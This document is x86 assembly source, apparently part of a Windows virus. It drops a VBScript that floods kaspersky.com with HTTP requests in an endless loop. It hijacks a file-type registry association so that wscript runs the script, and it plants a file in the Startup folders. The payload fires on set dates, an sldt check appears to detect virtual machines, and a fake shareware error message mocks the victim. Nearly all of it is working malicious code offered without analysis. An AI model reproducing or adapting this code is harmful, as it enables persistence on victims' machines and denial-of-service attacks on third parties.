   .data
   Laugh        db "Error 617573 :Shareware period has been elapsed!",13,10,"For more info search for 'Fakedminded' on google ,and play warcraft too!",0
   Cry          db "Sorry Unable to extract the file!",0
   run_3        db "C:\Documents And Settings\All Users\Start Menu\Programs\Startup\sysvb.sy64",0
   run_4        db "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sysvb.sy64",0

   subkeyV      db ".sy64",0
   subkey_vertV db "DOS1234\shell\open\command",0
   keyV         db "DOS1234",0
   key_vertV    db '"C:\windows\system32\wscript.exe" c:\kloka.vbs',0
   sizeRGV      dd sizeof keyV
   type_szV     dd REG_SZ

   .data?
   hkeyV        dd ?

   .code

   vb_inst:
       invoke RegCreateKeyEx,HKEY_CLASSES_ROOT,offset subkeyV,0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,offset hkeyV,offset bwr
       cmp hkeyV,0
       jnz @f
       ret
       @@:
       invoke RegSetValueEx,hkeyV,0,0,type_szV,offset keyV, sizeRGV
       or eax,eax
       jz @f
       ret
       @@:
       invoke RegCloseKey,hkeyV
       invoke RegCreateKeyEx,HKEY_CLASSES_ROOT,offset subkey_vertV,0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,offset hkeyV,offset bwr
       cmp hkeyV,0
       jnz @f
       ret
       @@:
       invoke lstrlen,offset key_vertV
       mov sizeRGV,eax
       invoke RegSetValueEx,hkeyV,0,0,type_szV,offset key_vertV, sizeRGV
       or eax,eax
       jz @f
       ret
       @@:
       invoke RegCloseKey,hkeyV
       invoke CreateFile,offset run_3,40000000h,0,0,2,0,0
       invoke CloseHandle,eax
       invoke CreateFile,offset run_4,40000000h,0,0,2,0,0
       invoke CloseHandle,eax

       ret

   .data
   drop_vb db 'Set http = CreateObject("Microsoft.XmlHttp")',13,10
           db 'Do',13,10
           db 'URL2="http://www.kaspersky.com"',13,10
           db 'http.open "GET", URL2, FALSE',13,10
           db 'http.send "/"',13,10
           db 'WScript.Sleep(10000)',13,10
           db 'Loop',13,10

   size_vb = $- offset drop_vb
   vbfilename db "c:\kloka.vbs",0
   dateformat db "ddMM",0

   .data?
   buf_date   db 12 dup(?)

   .code
   payload:
       invoke CreateFile,offset vbfilename,40000000h,0,0,2,0,0
       push eax
       invoke WriteFile,eax,offset drop_vb,size_vb,offset bwr,0
       call CloseHandle
       call vb_inst
       ret

   check_payload:
       invoke GetDateFormat,0,0,0,offset dateformat,offset buf_date,12
       xor eax,eax
       mov esi,offset buf_date
       cmp word ptr[esi],'40'
       jz @f
       cmp word ptr[esi],'21'
       jz @_1
       ret
       @_1:
       inc eax
       ret

       @@:
       cmp word ptr [esi+2],'01'
       jz @f

       ret
       @@:
       xor eax,eax
       dec eax

       ret

       tt1:
       invoke MessageBox,0,offset Laugh,offset Cry,0
       pop edx
       ret

   paytime:
       xor ebx,ebx
       mov ebx,esp
       sldt word ptr [ebx+8]
       xor eax,eax
       mov eax,dword ptr [ebx+8]
       or eax,eax
       jnz @f
       pop edx
       ret
       @@:

       call check_payload
       or eax,eax
       jz @f
       dec eax
       or eax,eax
       jz tt1
       call payload
       @@:
       ret
